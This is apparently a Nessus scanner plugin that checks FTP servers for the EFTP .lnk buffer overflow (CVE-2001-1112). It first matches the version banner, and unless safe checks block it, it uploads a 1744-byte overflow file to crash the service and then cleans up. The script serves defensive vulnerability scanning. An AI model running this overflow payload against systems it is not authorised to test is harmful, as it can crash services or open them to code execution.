#
# This script was written by Michel Arboi <arboi@noos.fr>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10928);
 script_bugtraq_id(3330);
 script_version("$Revision: 1.13 $");
 script_cve_id("CVE-2001-1112");
 name["english"] = "EFTP buffer overflow";
 name["francais"] = "Débordement mémoire dans EFTP";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the EFTP service by
uploading a *.lnk file containing too much data.

A cracker may use this attack to make this
service crash continuously, or run arbitrary code
on your system.


Solution: upgrade EFTP to 2.0.8.x

Risk factor : High";


 desc["francais"] = "
Il a été possible de faire planter le service EFTP 
en envoyant un fichier *.lnk qui contenait trop 
de données.

Un pirate peut exploiter cette faille 
pour faire planter continuellement ce
service, ou exécuter n'importe quel code sur 
le système.

Solution: mettez à jour EFTP en 2.0.8.x

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "EFTP buffer overflow";
 summary["francais"] = "Débordement mémoire dans EFTP";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2001 Michel Arboi",
		francais:"Ce script est Copyright (C) 2001 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";

 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/ftp", 21);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 exit(0);
}

#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if (!port) port = 21; 

state = get_port_state(port);
if (!state) exit(0);

user_login = get_kb_item("ftp/login");
user_passwd = get_kb_item("ftp/password");
writeable_dir = get_kb_item("ftp/writeable_dir");
use_banner = 1;

if (user_login && user_passwd && writeable_dir)
{
 use_banner = safe_checks();
}

if (use_banner)
{
 banner = get_ftp_banner(port: port);
 if(egrep(pattern:".*EFTP Version 2\.0\.[0-7]\.*", string:banner))
 {
  desc = "
It may be possible to crash the EFTP service by
uploading a *.lnk file containing too much data.

A cracker may use this attack to make this
service crash continuously, or run arbitrary code
on your system.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution: upgrade EFTP to 2.0.8.x

Risk factor : High";
  security_hole(port:port, data:desc);
 } 
 exit(0);
}

soc = open_sock_tcp(port);
if (!soc) exit(0);




r = ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
if (!r) 
{
 ftp_close(socket: soc);
 exit(0);
}

# Go to writable dir
cmd = string("CWD ", writeable_dir, "\r\n");
send(socket:soc, data:cmd);
a = recv_line(socket:soc, length:1024);

f_name =  string("ness", rand()%10, rand()%10, rand()%10, rand()%10, ".lnk");

# Upload a buggy .LNK
port2 = ftp_pasv(socket:soc);
soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
if ( ! soc2 ) exit(0);
cmd = string("STOR ", f_name, "\r\n");
send(socket:soc, data:cmd);
r = recv_line(socket:soc, length:1024);	# Read the 3 digits ?
if(ereg(pattern:"^5[0-9][0-9] .*", string:r)) exit(0);


d = string(crap(length:1744, data: "A"), "CCCC");
send(socket:soc2, data:d);
close(soc2);

# Now run DIR
cmd = string("LIST\r\n");
send(socket:soc, data:cmd);
r = recv_line(socket: soc, length: 1024);
ftp_close(socket: soc);

# Now check if it is still alive
soc = open_sock_tcp(port);
if (! soc)
{
 security_hole(port);
}

# Or clean mess :)

if (soc)
{ 
 ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
 cmd = string("CWD ", writeable_dir, "\r\n");
 send(socket:soc, data:cmd);
 r = recv_line(socket:soc, length:1024);
 cmd = string ("DELE ", f_name, "\r\n");
 send(socket:soc, data:cmd);
 r = recv_line(socket:soc, length:1024);
 ftp_close(socket: soc);
}
